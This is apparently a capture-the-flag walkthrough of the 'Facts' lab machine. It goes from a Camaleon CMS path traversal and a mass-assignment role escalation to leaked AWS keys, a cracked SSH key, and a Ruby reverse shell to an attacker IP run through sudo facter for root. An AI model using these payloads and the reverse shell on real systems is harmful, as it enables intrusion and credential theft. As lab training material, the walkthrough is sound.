# Facts - Easy

```sh
sudo vim /etc/hosts
# add facts.htb

nmap -T4 -p- -A -Pn -v facts.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
    * 80/tcp - http - nginx 1.26.3
    * 54321/tcp - unknown

* the website is a trivia webpage; an email 'contact@facts.htb' is mentioned in footer

* ```wappalyzer``` shows the webpage could be using 'Ruby on Rails' as the web framework

* exploring the webpage shows there are many facts, with comments on each post; the comments repeat the same usernames 'Bob', 'Carol', 'Dave', and 'Jean'

* the page source code shows the directory '/randomfacts' but we cannot access this

* the webpage also provides a search functionality at '/search' - if we search for anything, we can see the URL parameter 'q' is used for the search query

* if the search results are having multiple pages, it has another URL parameter for 'page' - like 'http://facts.htb/search?page=2&q=f'

* web scan:

    ```sh
    gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md -t 25
    # dir scan

    ffuf -c -u 'http://facts.htb' -H 'Host: FUZZ.facts.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 154 -s
    # subdomain scan
    ```

* ```gobuster``` scan shows a lot of false positives, but discloses a few other pages - these can also be accessed with the '.php' extension:
    
    * /admin - this leads to a login page at 'http://facts.htb/admin/login'

    * /page - this leads to a listing of all posts

    * /post - this does not give anything

    * /robots.txt - this includes a single line - "# See https://www.robotstxt.org/robotstxt.html for documentation on how to use the robots.txt file"

    * /robots - this links to /sitemap

* checking the login page, we also have an option to create an account at '/register', and a forgot password link at '/forgot'

* if we try default creds like 'admin:admin', it does not work and we get the error 'Username or Password incorrect'

* the '/forgot' page has an input field for email address - it will send an email for reset password

* we can create a new test account to check further

* by registering for a new account and logging in, we are able to access the admin dashboard at '/admin'

* the footer discloses it is using Camaleon CMS, version 2.9.0

* Googling for exploits associated with "Camaleon CMS 2.9.0" gives 2 exploits:

    * [this GitHub advisory showing a privesc vuln CVE-2025-2304 in Camaleon CMS 2.9.0](https://github.com/advisories/GHSA-rp28-mvq3-wf8j), which links to [the Camaleon CMS project](https://github.com/owen2345/camaleon-cms/releases/tag/2.9.1) as well

    * [a LFI vuln CVE-2024-46987 impacting the 'download_private_file' method](https://nvd.nist.gov/vuln/detail/CVE-2024-46987) which impacts Camaleon CMS 2.8.2

* testing for CVE-2024-46987, we get the exploit PoC in this format from the search results:

    ```sh
    http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
    ```

* if we navigate to this link, we do get a file for download - and the file does give the output of ```/etc/passwd```

* from ```/etc/passwd```, we get two users 'trivia' & 'william'

* we can try fetching ```authorized_keys``` and ```id_rsa``` files for both of these users - this works for 'trivia' user and we get the ```authorized_keys``` file only

* we can try to SSH using this:

    ```sh
    chmod 600 authorized_keys

    ssh -i authorized_keys trivia@facts.htb
    # Load key "authorized_keys": error in libcrypto
    # this does not work and needs a password
    ```

* as we need a passphrase, we have to possibly check for a private key file or cleartext creds

* we can check the other privesc exploit impacting this webpage

* for CVE-2025-2304, the search results do not show any public PoC, but we have [posts explaining the vuln itself](https://www.tenable.com/security/research/tra-2025-09)

* the post explains that when an user updates their password, the ```updated_ajax``` method is used - this uses the dangerous ```permit!``` method, which allows all params to pass through without any filtering

* so we can exploit this vuln by submitting a request with an extra param that includes the 'role' attribute to privesc to administrator

* checking [the commit from the linked release 2.9.0 which fixes the 'updated_ajax' function](https://github.com/owen2345/camaleon-cms/pull/1109/commits/97f00aedbbb90d7e762b60b2b140e22021014bf2), we can see the removal of the ```permit!``` function from the code snippet

* this is the previous, vulnerable code snippet:

    ```ruby
    def updated_ajax
    @user = current_site.users.find(params[:user_id])
    update_session = current_user_is?(@user)
    @user.update(params.require(:password).permit!)
    render inline: @user.errors.full_messages.join(', ')
    # keep user logged in when changing their own password
    update_auth_token_in_cookie @user.auth_token if update_session && @user.saved_change_to_password_digest?
    end

    def update_auth_token_in_cookie(token)
    ```

    * ```@user.update(params.require(:password).permit!)``` needs a 'password' parameter block

    * this parameter structure could look like:

        ```json
        {
        "password": {
            "password": "newpass",
            "password_confirmation": "newpass"
        }
        }
        ```
    
    * due to the ```permit!``` function, we can include a 'role' attribute, and this attribute needs to adhere to the 'password' parameter structure

* we can test this by navigating to our profile settings at 'http://facts.htb/admin/profile/edit' - we have an option here for 'Change Password'

* we can intercept the requests in Burp Suite to check the format

* clicking on 'Change Password' gives a pop-up with fields 'New Password' & 'Repeat New' - we can enter the new password here

* on submitting the request, we can see the POST request to '/admin/users/5/updated_ajax', where '5' is our user ID, and the data format is:

    ```js
    _method=patch&authenticity_token=BaecjNj8fEGIXgx342cniUaR1xjgsvGr1MeQW5syFBPLoRCatm4H-SqYb2weujLWayJwYFpoOn57uLQgoN_vWA&password%5Bpassword%5D=testthis&password%5Bpassword_confirmation%5D=testthis
    ```

* its URL-decoded form would look like this:

    ```js
    _method=patch&authenticity_token=BaecjNj8fEGIXgx342cniUaR1xjgsvGr1MeQW5syFBPLoRCatm4H-SqYb2weujLWayJwYFpoOn57uLQgoN_vWA&password[password]=testthis&password[password_confirmation]=testthis
    ```

* following the exploit info, we can include a 'role' attribute for the 'password' parameter required - we can test with the role 'admin' for the privesc:

    ```js
    _method=patch&authenticity_token=BaecjNj8fEGIXgx342cniUaR1xjgsvGr1MeQW5syFBPLoRCatm4H-SqYb2weujLWayJwYFpoOn57uLQgoN_vWA&password[password]=testthis&password[password_confirmation]=testthis&password[role]=admin
    ```

* the final, URL-encoded data blob to be forwarded is:

    ```js
    _method=patch&authenticity_token=BaecjNj8fEGIXgx342cniUaR1xjgsvGr1MeQW5syFBPLoRCatm4H-SqYb2weujLWayJwYFpoOn57uLQgoN_vWA&password%5Bpassword%5D=testthis&password%5Bpassword_confirmation%5D=testthis&password%5Brole%5D=admin
    ```

* now, this should privesc our role to 'admin', so if we navigate back to the dashboard view at 'http://facts.htb/admin', we can see we have more options in the navbar

* navigating to Media - we have an option to upload files here, so we can try uploading a PHP reverse shell file

* if we upload the PHP reverse shell and access it at the given URL 'http://facts.htb/randomfacts/php-reverse-shell.php', it prompts for a download - so we cannot use this to get reverse shell

* similarly, if we try to insert the PHP revshell in a page/post, it inserts the link but we cannot use this to get RCE

* checking the website admin section further, if we navigate to Settings > General Site > Filesystem Settings, we can see AWS secrets disclosed:

    * AWS s3 access key - AKIABDE6057BA272A060
    * AWS s3 secret key - 3XROsuDaW/X/FHaNoUy8fwG1H9PKOfUsOtppn2F2
    * AWS s3 bucket name - randomfacts
    * AWS s3 region - us-east-1
    * AWS s3 bucket endpoint - http://localhost:54321
    * Cloudfront url - http://facts.htb/randomfacts

* we can try to [abuse the AWS keys](https://exploit-notes.hdks.org/exploit/cloud/aws/):

    ```sh
    aws configure
    # when prompted, enter the access key ID, secret access key, region
    # output format can be 'json'

    aws --endpoint-url http://facts.htb:54321 s3 ls
    # list AWS S3 contents
    ```

* this works, and we can see the bucket contents include 'randomfacts' & 'internal' - we can check the contents:

    ```sh
    aws --endpoint-url http://facts.htb:54321 s3 ls s3://randomfacts
    # check 'randomfacts' bucket contents

    aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal
    # check 'internal' bucket contents
    ```

* the 'internal' bucket contents includes a '.ssh' folder - we can check the contents further by downloading everything:

    ```sh
    mkdir facts

    cd facts

    aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal . --recursive

    ls -la
    # check files
    # we have '.ssh'

    cd .ssh

    ls -la
    # we have 'authorized_keys' and 'id_ed25519'
    ```

* we can try cracking the private key using ```john```:

    ```sh
    ssh2john id_ed25519 > id_hash

    john --wordlist=/usr/share/wordlists/rockyou.txt id_hash
    # this gives cleartext 'dragonballz'
    ```

* we can try logging in with the password 'dragonballz' for users 'trivia' & 'william':

    ```sh
    chmod 600 id_ed25519

    ssh -i id_ed25519 william@facts.htb
    # this fails

    ssh -i id_ed25519 trivia@facts.htb
    # this works

    ls -la

    ls -la /home

    ls -la /home/williams

    cat /home/williams/user.txt
    # user flag

    sudo -l
    # (ALL) NOPASSWD: /usr/bin/facter
    ```

* ```sudo -l``` shows that we can run ```/usr/bin/facter``` as all users, including sudo

* Google shows that ```facter``` is a command-line tool for collecting system info (facts), and is used with Puppet infra in automation

* [GTFObins](https://gtfobins.org/gtfobins/facter/) includes an entry for ```facter``` sudo exploit, so we can try it out

* we need a Ruby reverse shell for this, so we can [refer this Gist](https://gist.github.com/gr33n7007h/c8cba38c5a4a59905f62233b36882325):

    ```rb
    require 'socket'

    s = Socket.new 2,1
    s.connect Socket.sockaddr_in 6767, '10.10.15.43'

    [0,1,2].each { |fd| syscall 33, s.fileno, fd }
    exec '/bin/sh -i'
    ```

    ```sh
    # on attacker
    nc -nvlp 6767
    # setup listener
    ```

    ```sh
    # on target
    vim test.rb
    # paste Ruby revshell code

    sudo /usr/bin/facter --custom-dir=/home/trivia x
    # this executes the first '.rb' file in target directory as per GTFObins exploit

    # this works and we get reverse shell as root
    ```

    ```sh
    # in reverse shell

    id
    # root

    cat /root/root.txt
    # root flag
    ```
